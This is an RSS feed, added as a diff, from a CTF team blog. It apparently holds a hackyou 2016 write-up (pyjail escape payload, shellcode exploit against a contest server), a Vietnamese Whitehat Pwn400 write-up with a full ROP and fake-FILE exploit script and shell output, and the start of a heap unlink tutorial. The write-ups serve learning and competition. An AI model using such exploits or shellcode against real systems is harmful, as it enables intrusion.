@@ -1,0 +1,1548 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	
+xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
+>
+
+<channel>
+	<title>pwn &#8211; BabyPhD CTF Team</title>
+	<atom:link href="https://babyphd.net/category/pwn/feed/" rel="self" type="application/rss+xml" />
+	<link>https://babyphd.net</link>
+	<description>Nói chung đây là một khái niệm vô cùng trừu tượng</description>
+	<lastBuildDate>Thu, 27 Jul 2017 19:02:33 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+<site xmlns="com-wordpress:feed-additions:1">104079289</site>	<item>
+		<title>hackyou.ctf.su 2016</title>
+		<link>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/</link>
+				<comments>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/#comments</comments>
+				<pubDate>Thu, 24 Nov 2016 17:13:17 +0000</pubDate>
+		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+		<category><![CDATA[re]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=627</guid>
+				<description><![CDATA[This is my write-up for recent hack you spb CTF - a CTF for newbies. I guess I'm a bit older here ahaha. Reverse 100: #include &#60;stdio.h&#62; #include &#60;string.h&#62; int main() { char buf[64]; gets(buf); int l = strlen(buf); if (l * l != 144) return 1; unsigned int a = buf[0] &#124; (buf[4] &#60;&#60; 8) &#124; &#8230; <a href="https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/" class="more-link">Continue reading <span class="screen-reader-text">hackyou.ctf.su 2016</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>This is my write-up for recent <a href="http://hackyou.ctf.su/">hack you spb</a> CTF - a CTF for newbies. I guess I'm a bit older here ahaha.</p>
+<p><span id="more-627"></span></p>
+<p>Reverse 100:</p>
+<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+	char buf[64];
+	gets(buf);
+	int l = strlen(buf);
+	if (l * l != 144)
+		return 1;
+	unsigned int a = buf[0] | (buf[4] &lt;&lt; 8) | (buf[8] &lt;&lt; 16);
+	unsigned int b = buf[1] | (buf[5] &lt;&lt; 8) | (buf[9] &lt;&lt; 16);
+	unsigned int c = buf[2] | (buf[6] &lt;&lt; 8) | (buf[10] &lt;&lt; 16);
+	unsigned int d = buf[3] | (buf[7] &lt;&lt; 8) | (buf[11] &lt;&lt; 16);
+	if (!(((a % 3571) == 2963) &amp;&amp; (((a % 2843) == 215)) &amp;&amp; (((a % 30243) == 13059))))
+		return 2;
+	if (!(((b % 80735) == 51964) &amp;&amp; (((b % 8681) == 2552)) &amp;&amp; (((b % 40624) == 30931))))
+		return 3;
+	if (!(((c % 99892) == 92228) &amp;&amp; (((c % 45629) == 1080)) &amp;&amp; (((c % 24497) == 12651))))
+		return 4;
+	if (!(((d % 54750) == 26981) &amp;&amp; (((d % 99627) == 79040)) &amp;&amp; (((d % 84339) == 77510))))
+		return 5;
+	printf("Congratulations %s is flag\n",buf);
+	return 0;
+}</pre>
+<p>First of all, I think about use something like z3, or any SAT that could give me the valid number. But z3 took a lot of time, so I decided to look deeper... Yes, you could finger out there is a pattern (x % number1 == number2), so you could apply <b><a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese remainder theorem</a> </b>to get a, b, c.</p>
+<p>Reverse 200:<br />
+This is a .pyc file, which is a file contain python byte-code. As usual, for byte-code relative problems, I search for some python byte-code decompiler and found <a href="https://github.com/zrax/pycdc">pycdc</a>.<br />
+After decompil, you should get something like this</p>
+<pre class="lang:python decode:true"># Source Generated with Decompyle++
+# File: rev200_bot_7b541a1.pyc (Python 2.7)
+
+import config
+import traceback
+import re
+from base64 import *
+from twx.botapi import TelegramBot, ReplyKeyboardMarkup, ReplyKeyboardHide
+sec_state = { }
+
+def process_message(bot, u):
+Warning: Stack history is not empty!
+    if u.message.sender and u.message.text and u.message.chat:
+        chat_id = u.message.chat.id
+        user = u.message.sender.username
+        reply_hide = ReplyKeyboardHide.create()
+        print 'user:%s mes:%s' % (user, u.message.text)
+        if user not in sec_state:
+            sec_state[user] = {
+                'mode': 15,
+                'stage': 7 }
+        cmd1 = u.message.text.encode('utf-8')
+        a = re.findall('(\\/\\w+)\\s*(.*)', cmd1)
+        if a:
+            cmd = a[0][0]
+            data = a[0][1]
+            if cmd == '/help':
+                bot.send_message(chat_id, 'Usage: \n\n/help - show this help\n/enter - enter secret mode\n', reply_markup = reply_hide)
+            if cmd == '/enter':
+                keyboard = [
+                    [
+                        '-7-',
+                        '-8-',
+                        '-9-'],
+                    [
+                        '-4-',
+                        '-5-',
+                        '-6-'],
+                    [
+                        '-1-',
+                        '-2-',
+                        '-3-'],
+                    [
+                        '-0-']]
+                reply_markup = ReplyKeyboardMarkup.create(keyboard)
+                bot.send_message(chat_id, 'please enter access code', reply_markup = reply_markup).wait()
+            if sec_state[user]['mode'] == 0 and cmd == '/7779317':
+                ddd = b64decode(data)
+                bot.send_message(chat_id, eval(ddd))
+            
+        a = re.findall('-(\\d+)-', cmd1)
+        if a:
+            num = a[0]
+            if int(num) == sec_state[user]['stage']:
+                sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
+                sec_state[user]['mode'] = sec_state[user]['mode'] - 1
+                if sec_state[user]['mode'] &lt; 0:
+                    sec_state[user]['mode'] = 0
+                if sec_state[user]['mode'] == 0:
+                    bot.send_message(chat_id, 'Secret mode enabled!', reply_markup = reply_hide).wait()
+                
+            else:
+                print 'NO', num, sec_state[user]['stage']
+                bot.send_message(chat_id, 'Invalid password!', reply_markup = reply_hide).wait()
+                sec_state[user]['mode'] = 15
+        
+
+bot = TelegramBot(config.token)
+bot.update_bot_info().wait()
+print bot.username
+last_update_id = 0
+while True:
+    updates = bot.get_updates(offset = last_update_id).wait()
+    
+    try:
+        for update in updates:
+            if int(update.update_id) &gt; int(last_update_id):
+                last_update_id = update.update_id
+                process_message(bot, update)
+                continue
+    continue
+    except Exception:
+        ex = None
+        print traceback.format_exc()
+        continue
+    
+</pre>
+<p>So this is a kind of chat-bot server based on Telegram.<br />
+There is eval function inside,  bot.send_message(chat_id, eval(ddd)), so I need to control ddd which is a base64 decoded string from data we sent. Before that, I need to enter Secret mode by enter correct access code (0-9).<br />
+First, set sec_state[user]['mode'] = 0; First time, stage init to 7, that changed everytime you press the correct key; But if I dont remember the stage, I still could find out by bruteforce from 0 to 9, if I didn't recv incorrect message that's mean I pressed the correct one; then by use the following script, I'm able to access secret area;</p>
+<pre class="lang:python decode:true ">#coding: utf-8
+sec_state = { }
+user = "A"
+sec_state[user] = {
+'mode': 15,
+'stage': 7 } # bruteforce number
+sec_state[user]['mode'] = 15
+r = []
+while 1:
+	num = sec_state[user]['stage']
+	r.append(num)
+	print "-%d-" % num
+	sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
+	sec_state[user]['mode'] = sec_state[user]['mode'] - 1
+	if sec_state[user]['mode'] &lt; 0:
+	    sec_state[user]['mode'] = 0
+	if sec_state[user]['mode'] == 0:
+		break
+
+print sec_state[user]['mode']</pre>
+<p>Next, this is a <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">pyjail</a>, so I can't execute normal python command...<br />
+So, final payload is `str(().__class__.__base__.__subclasses__()[<strong>40</strong>]("flag","r").read())`or `/7779317 c3RyKCgpLl9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpWzQwXSgiZmxhZyIsInIiKS5yZWFkKCkp`</p>
+<p>Reverse 300:<br />
+Let's get some fun.</p>
+<p>let reverse this (or not?), look at handler (the main function)</p>
+<pre class="lang:c decode:true">ssize_t __cdecl handler(int fd)
+{
+  ssize_t result; // eax@1
+  unsigned int buf; // [sp+20h] [bp-18h]@1
+  int v3; // [sp+24h] [bp-14h]@1
+  char *v4; // [sp+28h] [bp-10h]@4
+  int v5; // [sp+2Ch] [bp-Ch]@4
+
+  buf = 0;
+  setuid(0x3E8u);
+  seteuid(0x3E8u);
+  setgid(0x3E8u);
+  setegid(0x3E8u);
+  result = recv(fd, &amp;buf, 4u, 0);
+  v3 = result;
+  if ( result == 4 )
+  {
+    result = buf;
+    if ( buf &lt;= 0xC8 )
+    {
+      v4 = (char *)mmap(0, buf, 7, 33, -1, 0);
+      v3 = recv(fd, v4, buf, 0);
+      result = crc32(0, v4, buf);
+      v5 = result;
+      if ( result == 0xCAFEBABE )
+      {
+        result = filter(v4, buf) ^ 1;
+        if ( !(_BYTE)result )
+          result = ((int (*)(void))v4)();
+      }
+    }
+  }
+  return result;
+}</pre>
+<p>So the basic idea is make result == 0xCAFEBABE, so the program will execute v4 as shellcode (function pointer), but you also need to bypass the filter function - check if contain any of 0x0, 0x1, 0x2f, 0x68, 0x73 ( so I can't use sh in plaintext)then exit; So, I did the following step:</p>
+<p>1. Find a program that can make crc32 of my shellcode equal 0xCAFEBABE<br />
+2. Make a great shellcode and Bypass filter.<br />
+By search google for everything, the answer for problem 1 is<a href="https://www.nayuki.io/page/forcing-a-files-crc-to-any-value"> force-crc32</a>.<br />
+Currently I'm also trying to learn some binary exploit method, write a shellcode isn't hard (hint <em>xor</em>), but if there is any framework that's good enough as <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code> </a>, you shoud try at least once.<br />
+Basicaly, I import pwns and let pwntools do the rest;</p>
+<pre class="lang:python decode:true ">from pwn import *
+import socket, struct, telnetlib
+def getCRC(data):
+	import subprocess
+	with open('/tmp/12', 'wb') as f:
+		f.write(data + "123456")
+	subprocess.check_output(['python', 'forcecrc32.py', '/tmp/12', str(len(data)+1) , 'CAFEBABE'])
+	with open('/tmp/12', 'rb') as f:
+		data = f.read()
+	return data
+def crc32(data):# recheck
+	import zlib
+	return (zlib.crc32(data)) &amp; 0xffffffff
+
+
+d = ""
+d += asm(pwnlib.shellcraft.i386.linux.dup2(4,0))
+d += asm(pwnlib.shellcraft.i386.linux.dup2(4,1))
+# i need dup2 because the program use itself as server
+d += asm(pwnlib.shellcraft.i386.linux.sh())
+
+fsc = pwnlib.encoders.encoder.encode(d, '\n\x01\0\x2f\x73\x68')
+
+print len(fsc)
+fsc = getCRC(fsc) # it didn't contain any blocked char, so i dont need to re-generate again.
+print hex(crc32(fsc))
+
+#yes, i love my custom socket lib <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" />
+s = socket.create_connection(("78.46.101.237", 3177))
+
+s.send(p32(len(fsc)))
+s.send(fsc)
+s.send("\n")
+
+s.send("cat flag*\n") 
+print s.recv(1024)</pre>
+<p>To be continued....</p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">627</post-id>	</item>
+		<item>
+		<title>Whitehat Contest 12 - Pwn400</title>
+		<link>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/</link>
+				<comments>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/#comments</comments>
+				<pubDate>Sun, 11 Sep 2016 16:29:10 +0000</pubDate>
+		<dc:creator><![CDATA[hardtobelieve]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+		<category><![CDATA[whitehat]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=600</guid>
+				<description><![CDATA[Líp vẫn nhớ và yêu Híp nhiều lắm ... Chiến đấu bên những người anh em luôn làm tôi cảm thấy thoải mái và phấn khích. Đợt contest này cả đội đã có 1 ngày không ngủ, cũng gần như không ăn, chỉ dùng lon bò húc để cầm hơi. Cả đội đã rất nỗ &#8230; <a href="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/" class="more-link">Continue reading <span class="screen-reader-text">Whitehat Contest 12 - Pwn400</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<blockquote><p>Líp vẫn nhớ và yêu Híp nhiều lắm ...</p></blockquote>
+<p>Chiến đấu bên những người anh em luôn làm tôi cảm thấy thoải mái và phấn khích. Đợt contest này cả đội đã có 1 ngày không ngủ, cũng gần như không ăn, chỉ dùng lon bò húc để cầm hơi. Cả đội đã rất nỗ lực và hy vọng tràn trề khi lúc đầu liên tục tranh giành top 1 với kỳ phùng địch thủ. Cho đến giữa đêm, do thiếu một chút may mắn ( tôi thì không nghĩ vậy, đêm là khoảng thời gian tôi hay rơi vào trạng thái không ổn định <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?ssl=1"><img data-attachment-id="603" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/pudency/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pudency" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-603" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?resize=36%2C36&#038;ssl=1" alt="pudency" width="36" height="36" data-recalc-dims="1" /></a> ) mà mọi người mất dần ý chí chiến đấu, nhìn đội khác vươn lên. Có lẽ nếu như tôi dành được 400 điểm từ bài này thì mọi chuyện đã khác. Nhưng dù sao "có lẽ" vẫn chỉ là 1 từ người ta dùng để biện hộ cho lỗi lầm của mình mà thôi.<br />
+<span id="more-600"></span></p>
+<p>Đề bài cho 1 file binary có chức năng dùng để viết và đọc 1 file trên server. Thoạt nhìn, tôi đã thấy bài này quen rồi, và có vẻ như <a href="http://www.hardtobelieve.me/index.php/2016/07/30/file-abusing/" target="_blank">chủ đề này</a> vừa được tôi nghiên cứu cách đây 2 tháng. Ta có thể thấy lỗi khá rõ ràng ở hàm `read_file`</p>
+<pre class="lang:c decode:true ">int read_file()
+{
+  char ptr; // [sp+18h] [bp-110h]@4
+  size_t n; // [sp+118h] [bp-10h]@4
+  FILE *stream; // [sp+11Ch] [bp-Ch]@1
+
+  printf("file name: ");
+  __fpurge(stdin);
+  gets(name);
+  stream = fopen(name, "rb");
+  if ( !stream )
+  {
+    puts("Error: cannot open file. ");
+    exit(1);
+  }
+  fseek(stream, 0, 2);
+  n = ftell(stream);
+  fseek(stream, 0, 0);
+  fread(&amp;ptr, 1u, n, stream);            // Does not check boundary of ptr
+  puts(&amp;ptr);
+  return fclose(stream);
+}</pre>
+<p>Như vậy, ta có thể cho chương trình đọc một nội dung file có kích thước lớn để kích hoạt lỗi buffer overflow. Tuy nhiên, ta cũng thấy `ptr` nằm ở `sp + 18h` còn `stream` thì nằm ở `sp + 11Ch` nên có thể khai thác lỗi bằng cách dùng bảng <em>IO_FILE_JUMP</em>.</p>
+<h2>Bài toán 1</h2>
+<p>Vẫn chiến thuật cũ, tôi bắt đầu từ chương trình đơn giản hơn là gọi hàm `fclose()` với tham số truyền vào là một mảng char. Sau một thời gian sử dụng gdb và "lỗi đến đâu sửa đến đó", tôi đã tìm được những giá trị cần có trong mảng</p>
+<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
+char a[256];
+
+int main () {
+    *((int *)a + 1) = 0xdeadbeaf;
+    *((int *)a + 0x48 / 4) = a;
+    *((int *)a + 0x94 / 4) = a - 4;
+    fclose(a);
+    return 0;
+}</pre>
+<p>Và tất nhiên, kết qủa sẽ là `Invalid $PC address: 0xdeadbeaf`. Tuy nhiên, lần này tôi cũng nhận ra một điều là tôi không thể truyền được tham số khi gọi hàm theo kiểu này. Nếu cấc bạn step từng bước để vào bên trong libc, các bạn sẽ thấy trước khi call ,libc sẽ thực hiện:</p>
+<pre class="theme:shell-default lang:sh decode:true ">push 0x0
+push esi                            ; file pointer
+call DWORD PTR [eax + 0x8]</pre>
+<p>Tôi phát hiện ra rằng chương trình không có stack protector, nên nếu như tôi lừa libc cho nó chạy như bình thường với mảng char, tôi có thể đè lên EIP và các gía trị sau đố rồi làm như những bài BoF bình thường. Tôi thử gọi hàm puts thì được kết qủa:</p>
+<pre class="theme:shell-default lang:sh decode:true ">free(): invalid pointer: 0x0804a060 ***</pre>
+<p>Không ngoài dự đoán, theo như những gì google được thì hàm `fclose()` sau khi thực hiện việc đóng file sẽ giải phóng bộ nhớ đã cấp trước đó ( file pointer cũng là "híp" mà <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?ssl=1"><img data-attachment-id="611" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/big_smile/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="big_smile" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-611" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?resize=36%2C36&#038;ssl=1" alt="big_smile" width="36" height="36" data-recalc-dims="1" /></a> ).</p>
+<h2>Bài toán 2</h2>
+<p>Như vậy, ngoài việc biến mảng <strong>a</strong> thành một con trỏ file giả, thì ta cũng cần biến nó thành một heap chunk giả nữa. Tiếp tục sử dụng gdb, lần này thêm một cửa sổ khác để debug chương trình mà free một con trỏ đã malloc thực sự. Việc này giúp ta dễ dàng theo dõi luồng thực thi của chương trình đúng và biết sẽ phải sửa cái gì cho chương trình sai. Sau một hồi lâu sửa đi sửa lại, tôi cũng có được những gía trị cần tìm ( ở đây tôi chọn fclose(a + 16) cho nó thoải mái, tránh trường hợp truy xuất vào ô nhớ nào đó phía trước ):</p>
+<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
+char a[256];
+
+int main () {
+    puts("abcd");
+    *((int *)a + 3) = 0xa1;
+    *((int *)a + 4 + 1) = 0x8048350;
+    *((int *)a + 4 + 0x48 / 4) = a + 16;
+    *((int *)a + 4 + 0x94 / 4) = a + 16 - 4;
+    *((int *)a + 43) = 0x20b59;
+    *((int *)a + 44) = a + 34*4;
+    *((int *)a + 45) = a + 38*4;
+    *((int *)a + 34 + 3) = a + 42*4;
+    *((int *)a + 38 + 2) = a + 42*4;
+    fclose(a + 16);
+    return 0;
+}</pre>
+<p>Vậy là xong rồi, quay trở lại bài readfile, ta sẽ thực hiện 2 công việc:</p>
+<ul>
+<li>Gọi hàm write_file để tạo ra một file tên là "inp", nội dung sẽ là `padding + name_address + padding + rop chain`</li>
+<li>Gọi hàm read_file, đọc file có tên là "inp\x00" + fake_file_struct mà ta vừa tạo ra</li>
+</ul>
+<p>Ez local shell, Ez life</p>
+<pre class="theme:shell-default lang:sh decode:true ">[+] Opening connection to localhost on port 4000: Done
+[*] Closed connection to localhost port 4000
+[+] Opening connection to localhost on port 4000: Done
+[*] Puts: 0xf7e5cb80
+[*] Printf: 0xf7e46590
+[*] Closed connection to localhost port 4000
+[+] Opening connection to localhost on port 4000: Done
+[*] Closed connection to localhost port 4000
+[+] Opening connection to localhost on port 4000: Done
+[*] Switching to interactive mode
+
+$ id
+uid=1000(tuanit96) gid=1000(hardtobelieve) groups=1000(hardtobelieve),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ whoami
+tuanit96
+$  </pre>
+<h2> Bài toán 3 </h2>
+<p><strong>Proof of Concept</strong></p>
+<pre class="lang:python decode:true ">from pwn import *
+
+def read_file(name):
+	s.sendline("2")
+	s.recvuntil("file name: ")
+	s.sendline(name)
+
+def write_file(name, content):
+	s.sendline("1")
+	s.recvuntil("file name: ")
+	s.sendline(name)
+	s.recvuntil("Give me the size: ")
+	#print s.recv()
+	s.sendline(str(len(content)))
+	s.recvuntil("Give me the buffer: ")
+	s.sendline(content)
+
+name1 = "/tmp/abc"
+name2 = "/tmp/def"
+name3 = "/tmp/ghi"
+
+name_addr = 0x804a0a0 + 16
+puts_plt = 0x80485b0
+puts_got = 0x804a01c
+printf_got = 0x804a000
+popret = 0x080486c3
+start = 0x8048640
+
+s = remote("localhost", 4000)
+#s = remote("103.237.99.25",  23504)
+#s = remote("118.70.80.143", 23504)
+s.recvuntil("0:exit\n")
+
+write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(puts_plt) + p32(popret) + p32(puts_got) + p32(puts_plt) + p32(popret) + p32(printf_got))
+
+s.close()
+
+#s = remote("118.70.80.143", 23504)
+s = remote("localhost", 4000)
+#s = remote("103.237.99.25",  23504)
+s.recvuntil("0:exit\n")
+
+fake_file = "\x00"*4*1 + p32(0xa1) + "\x00"*4*1              # 2 blocks
+fake_file += p32(puts_plt) + "\x00"*4*16         # 17 blocks
+fake_file += p32(name_addr) + "\x00"*4*14        # 15 blocks
+fake_file += p32(name_addr + 38*4) + "\x00"*4*2    # 3 blocks
+fake_file += p32(name_addr + 38*4)                 # 1 blocks
+fake_file += p32(name_addr - 4) + "\x00"*4*1     # 2 blocks
+fake_file += p32(0x20b59)                        # 1 blocks
+fake_file += p32(name_addr + 30*4)                 # 1 blocks
+fake_file += p32(name_addr + 34*4)
+
+payload1 = name1 + fake_file
+read_file(payload1)
+data = s.recv()
+data += s.recv()
+
+puts = u32(data.split('\n')[-3][:4])
+printf = u32(data.split('\n')[-2][:4])
+log.info("Puts: " + hex(puts))
+log.info("Printf: " + hex(printf))
+
+s.close()
+
+system = printf - 0x00049590 + 0x0003ad80
+binsh = printf - 0x00049590 + 0x15ba3f
+
+s = remote("localhost", 4000)
+#s = remote("103.237.99.25",  23504)
+#s = remote("118.70.80.143", 23504)
+s.recvuntil("0:exit\n")
+
+write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(system) + p32(popret) + p32(binsh))
+
+s.close()
+
+#s = remote("103.237.99.25",  23504)
+s = remote("localhost", 4000)
+s.recvuntil("0:exit\n")
+read_file(payload1)
+s.interactive()
+</pre>
+<p>Tôi hí hửng exploit với con server của họ, ngờ đâu nó chết không thương tiếc <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?ssl=1"><img data-attachment-id="586" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beat_brick/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beat_brick" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?resize=36%2C36&#038;ssl=1" alt="beat_brick" width="36" height="36" class="alignnone size-full wp-image-586" data-recalc-dims="1" /></a>. Đờ đẫn một lúc không hiểu chuyện gì xảy ra, tôi mới thử đem sang một máy khác chạy bản ubuntu cũ hơn tôi, và nó cũng chịu chung số phận. Có vẻ libc ở bản cũ và bản mới khác nhau ( cách xử lý, offset, ... ). Lúc đó là 2h đêm và nghĩ đến việc giờ ngồi debug lại trên libc-2.19 là tôi lại muốn đi ... Ý <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img data-attachment-id="565" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/boss/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boss" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=36%2C36&#038;ssl=1" alt="boss" width="36" height="36" class="alignnone size-full wp-image-565" data-recalc-dims="1" /></a>. Tôi thầm mắng chửi ban tổ chức, lẽ ra phải đưa cả libc cho người chơi chứ, nhưng rồi lại nhận ra, có lẽ họ cũng không biết được điều đó xảy ra, cũng giống mình ban nãy vậy.</p>
+<p>Vậy là tôi đã đánh mất 400 điểm dù nó đã nằm trong tay, cảm giác thật giống với việc tối đã để tuột mất tay Híp khi vẫn còn đang nắm chặt vậy ...</p>
+]]></content:encoded>
+							<wfw:commentRss>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+						<post-id xmlns="com-wordpress:feed-additions:1">600</post-id>	</item>
+		<item>
+		<title>Unlink technique</title>
+		<link>https://babyphd.net/2016/04/07/unlink-technique/</link>
+				<pubDate>Thu, 07 Apr 2016 15:01:11 +0000</pubDate>
+		<dc:creator><![CDATA[hardtobelieve]]></dc:creator>
+				<category><![CDATA[pwn]]></category>
+		<category><![CDATA[heap]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=498</guid>
+				<description><![CDATA[Đây là một trong những kỹ thuật cơ bản dùng để khai thác lỗ hổng ở vùng nhớ heap Cấu trúc heap Glibc tổ chức 1 heap chunk như sau: struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; &#8230; <a href="https://babyphd.net/2016/04/07/unlink-technique/" class="more-link">Continue reading <span class="screen-reader-text">Unlink technique</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p>Đây là một trong những kỹ thuật cơ bản dùng để khai thác lỗ hổng ở vùng nhớ heap</p>
+<h1>Cấu trúc heap</h1>
+<p>Glibc tổ chức 1 heap chunk như sau:</p>
+<pre class="width:1000 lang:c decode:true">struct malloc_chunk {
+
+  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
+
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};</pre>
+<p><span id="more-498"></span></p>
+<p>Thông thường sau khi malloc, nếu ta dump heap ra thì sẽ chỉ thấy 2 thành phần là `prev_size` và `size`. 2 thành phần chính còn lại là fd và bk sẽ xuất hiện sau khi ta free.</p>
+<h2>Trước khi free</h2>
